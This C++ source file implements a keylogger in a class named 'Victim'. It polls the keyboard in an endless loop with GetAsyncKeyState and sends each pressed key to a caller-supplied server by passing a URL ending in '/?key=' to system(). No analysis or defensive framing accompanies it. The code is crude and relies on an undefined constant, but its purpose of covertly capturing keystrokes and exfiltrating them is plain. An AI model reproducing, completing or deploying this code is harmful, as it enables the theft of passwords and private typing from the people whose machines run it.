#include "Victim.h"

Victim::Victim(std::string target) {
	this->_target_server = target + "/?key=";
}

void Victim::recordAndSendKeys() {
	while (true) {
		for (char c = 2; c <= '~'; c++) {
			if (GetAsyncKeyState(c) == ACTIVE_PROMISE_CODE) {
				this->sendKey(c);
			}
		}
	}
}

void Victim::sendKey(char key) {
	system((this->_target_server + key).c_str());
}
